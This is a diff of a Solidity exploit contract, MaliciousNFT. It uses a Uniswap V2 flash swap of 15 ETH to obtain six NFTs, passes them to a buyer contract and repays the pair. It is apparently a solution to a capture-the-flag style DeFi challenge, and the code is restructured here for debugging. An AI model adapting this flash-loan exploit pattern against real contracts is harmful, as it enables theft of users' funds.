@@ -35,31 +35,14 @@ contract MaliciousNFT is IUniswapV2Callee, IERC721Receiver {
     }
 
     function attack() public {
-        //console.log("My balance: %s", address(this).balance);
-        pair.swap(15 * 10**18, 0, address(this), new bytes(uint256(1)));
+        console.log("My balance: %s", address(this).balance);
+        pair.swap(15 ether, 0, address(this), new bytes(uint256(1)));
     }
 
     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
-        //console.log("Received %s WETH from Uniswap", amount0);
+        console.log("Received %s WETH from Uniswap", amount0);
         require(amount0 == 15 * 10**18, "Not enough WETH");
         weth.withdraw(amount0);
-    }
-
-    receive() payable external {
-        //console.log("Recieved %s ETH", msg.value);
-        if (msg.sender == address(weth)) {
-            //console.log("The ETH came from WETH");
-            //console.log("My balance: %s", address(this).balance);
-            on_weth_converted();
-        } else if (msg.sender == address(buyer)) {
-            //console.log("The ETH came from the Buyer");
-            on_buyer_paid();
-        }
-    }
-    
-    function on_weth_converted() private {
-        console.log("on_weth_converted");
-        require(msg.value == 15 * 10**18, "Not enough ETH");
         uint256[] memory tokenIds = new uint256[](6);
         for (uint256 i = 0; i < 6; i++) {
             tokenIds[i] = i;
@@ -69,6 +52,11 @@ contract MaliciousNFT is IUniswapV2Callee, IERC721Receiver {
         for (uint256 i = 0; i < 6; i++) {
             nft.safeTransferFrom(address(this), address(buyer), i);
         }
+        weth.deposit{value: 16 ether}();
+        weth.transfer(address(pair), 16 ether);
+    }
+
+    receive() payable external {
     }
 
     function onERC721Received(
@@ -79,14 +67,10 @@ contract MaliciousNFT is IUniswapV2Callee, IERC721Receiver {
     ) 
         external
         override
+        pure
         returns (bytes4) 
     {
         return IERC721Receiver.onERC721Received.selector;
-    }
-
-    function on_buyer_paid() private {
-        weth.deposit{value: 16 ether}();
-        weth.transfer(address(pair), 16 ether);
     }
 
 }
